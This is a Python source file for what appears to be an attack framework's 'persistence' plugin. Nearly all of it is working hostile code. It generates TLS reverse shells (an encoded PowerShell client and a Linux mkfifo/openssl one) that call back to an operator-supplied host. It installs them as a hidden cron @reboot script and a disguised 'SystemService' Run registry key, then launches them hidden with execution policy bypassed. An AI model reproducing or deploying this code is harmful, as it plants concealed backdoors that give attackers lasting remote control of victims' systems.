r"""
Persistence plugin, install a reverse‑shell backdoor that survives reboots.
- Linux/Unix : `@reboot` crontab entry (runs only on startup)
- Windows    : `HKCU\...\Run` registry key (runs at user login)
The payload uses SSL/TLS encryption; the handler must listen on a TLS port.
"""

import argparse
import base64
import json
import os

from ...constants import PLUGIN_MARK_END, PLUGIN_MARK_START
from ..api import plugin, SessionContext
from .common import format_generic_report
from .runner import run_collector_plugin


def _generate_windows_payload_encoded(host: str, port: int) -> str:
    """Return base64‑encoded (UTF‑16LE) PowerShell SSL reverse‑shell."""
    ps_script = (
        f"$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; "
        f"$TCPClient = New-Object Net.Sockets.TCPClient('{host}', {port});"
        "$NetworkStream = $TCPClient.GetStream();"
        "$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));"
        "$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);"
        "if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) { $SslStream.Close(); exit }"
        "$StreamWriter = New-Object IO.StreamWriter($SslStream);"
        "function WriteToStream ($String) { [byte[]]$script:Buffer = New-Object System.Byte[] 4096 ; $StreamWriter.Write($String + 'SHELL> '); $StreamWriter.Flush() };"
        "WriteToStream '';"
        "while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {"
        "  $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);"
        "  $Output = try { Invoke-Expression $Command 2>&1 | Out-String } catch { $_ | Out-String };"
        "  WriteToStream ($Output)"
        "}"
        "$StreamWriter.Close()"
    )
    return base64.b64encode(ps_script.encode('utf-16le')).decode()


def _generate_linux_payload_command(host: str, port: int) -> str:
    """Raw reverse shell: mkfifo + openssl s_client + plain /bin/sh."""
    return (
        f'sleep 60; '
        f'mkfifo /tmp/s; '
        f'/bin/sh < /tmp/s 2>&1 '
        f'| openssl s_client -quiet -connect {host}:{port} > /tmp/s; '
        f'rm -f /tmp/s'
    )

def _build_unix_command(host: str, port: int) -> str:
    """
    Linux persistence via cron @reboot
    """
    payload = _generate_linux_payload_command(host, port)

    backdoor_script = f'''#!/bin/bash
export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"

rm -f /tmp/s

{payload}
'''

    script = f'''#!/bin/bash

HOME_DIR="$HOME"
if [ -z "$HOME_DIR" ]; then
    HOME_DIR="$(getent passwd $(whoami) | cut -d: -f6)"
fi

mkdir -p "$HOME_DIR/.local/bin"
cat > "$HOME_DIR/.local/bin/.backdoor" << 'EOF'
{backdoor_script}
EOF
chmod +x "$HOME_DIR/.local/bin/.backdoor"

(crontab -l 2>/dev/null | grep -v "$HOME_DIR/.local/bin/.backdoor" ; echo "@reboot $HOME_DIR/.local/bin/.backdoor") | crontab -

nohup "$HOME_DIR/.local/bin/.backdoor" >/dev/null 2>&1 &

echo "{PLUGIN_MARK_START}"
echo '{{"persistence_installed":true,"payload_executed":true,"script_path":"$HOME_DIR/.local/bin/.backdoor","method":"cron"}}'
echo "{PLUGIN_MARK_END}"
'''
    encoded = base64.b64encode(script.encode()).decode()
    return f"echo '{encoded}' | base64 -d | sh"

def _build_windows_command(host: str, port: int) -> str:
    r"""
    Windows persistence via HKCU Registry
    """
    encoded_payload = _generate_windows_payload_encoded(host, port)
    run_cmd = f'powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {encoded_payload}'

    ps_script = f'''
$ErrorActionPreference = "SilentlyContinue"

$scriptPath = "$env:Public\\backdoor.ps1"
$runCmd = @"
{run_cmd}
"@
$runCmd | Out-File -FilePath $scriptPath -Encoding ASCII -Force

$regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
$regValue = "powershell -NoP -NonI -Exec Bypass -File `"$scriptPath`""
New-ItemProperty -Path $regPath -Name "SystemService" -PropertyType String -Value $regValue -Force

Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-NoP -NonI -Exec Bypass -File `"$scriptPath`""

$result = @{{
    persistence_installed = $true
    payload_executed = $true
    script_path = $scriptPath
    registry_key = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemService"
}} | ConvertTo-Json -Compress

Write-Output "{PLUGIN_MARK_START}"
Write-Output $result
Write-Output "{PLUGIN_MARK_END}"
exit 0
'''
    encoded_script = base64.b64encode(ps_script.encode('utf-16le')).decode()
    return f'powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {encoded_script}'

@plugin.command(
    name='persistence',
    platforms=['linux', 'windows', 'unix'],
    description=(
        'Install a persistent reverse‑shell backdoor (cron @reboot / Run registry) '
        'and execute it immediately.  The payload uses **TLS/SSL encryption** – '
        'the handler must listen on a TLS‑capable port (e.g., openssl s_server).'
    ),
)
def run(session: SessionContext, args):
    parser = argparse.ArgumentParser(
        prog='persistence',
        description=(
            'Deploy a TLS‑encrypted reverse shell that survives reboots. '
            'The listener must accept SSL/TLS connections on the given port.'
        )
    )
    parser.add_argument(
        '-rh', '--host', required=True,
        help='Callback host IP (the TLS listener address).'
    )
    parser.add_argument(
        '-rp', '--port', required=True, type=int,
        help='TLS listener port (must match the port where your SSL handler is listening).'
    )

    if not args:
        parser.print_usage()
        return "Error: missing required arguments: -rh HOST -rp PORT"

    try:
        parsed = parser.parse_args(args)
    except SystemExit:
        return "Error: invalid arguments provided. Use -rh HOST -rp PORT"

    host = parsed.host
    port = parsed.port

    unix_cmd = lambda: _build_unix_command(host, port)
    windows_cmd = lambda: _build_windows_command(host, port)

    return run_collector_plugin(
        session,
        'persistence',
        unix_cmd,
        windows_cmd,
        format_generic_report,
        timeout=30.0,
    )